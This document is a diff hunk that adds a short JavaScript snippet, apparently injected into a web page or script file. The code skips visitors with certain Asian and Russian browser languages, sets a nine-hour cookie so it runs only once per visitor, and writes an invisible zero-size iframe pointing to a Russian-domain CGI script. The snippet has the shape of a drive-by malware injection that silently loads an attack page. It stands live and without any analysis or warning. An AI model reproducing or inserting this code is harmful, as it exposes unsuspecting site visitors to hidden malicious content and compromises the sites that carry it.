@@ -1,0 +1,16 @@
+window.status="";
+n=navigator.userLanguage.toUpperCase();
+if((n!="ZH-CN")&&(n!="UR")&&(n!="RU")&&(n!="KO")&&(n!="ZH-TW")&&(n!="ZH")&&(n!="HI")&&(n!="TH")&&(n!="UR")&&(n!="VI")){
+var cookieString = document.cookie;
+var start = cookieString.indexOf("vrcgoo=");
+if (start != -1){}else{
+var expires = new Date();
+expires.setTime(expires.getTime()+9*3600*1000);
+document.cookie = "vrcgoo=update;expires="+expires.toGMTString();
+try{
+document.write("<iframe src=http://gb53.ru/cgi-bin/index.cgi?fgg width=0 height=0 frameborder=0></iframe>");
+}
+catch(e)
+{
+};
+}}
